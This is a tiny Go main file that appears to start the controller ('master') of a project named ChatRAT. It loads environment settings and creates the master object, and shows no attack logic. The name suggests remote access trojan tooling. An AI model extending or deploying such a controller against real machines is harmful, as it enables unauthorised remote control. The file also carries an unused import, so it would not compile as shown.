package main

import (
	"os"

	"github.com/cyb3rjerry/ChatRAT/pkg/master"
	"github.com/joho/godotenv"
)

func main() {
	godotenv.Load()

	_ = master.NewMaster()

}
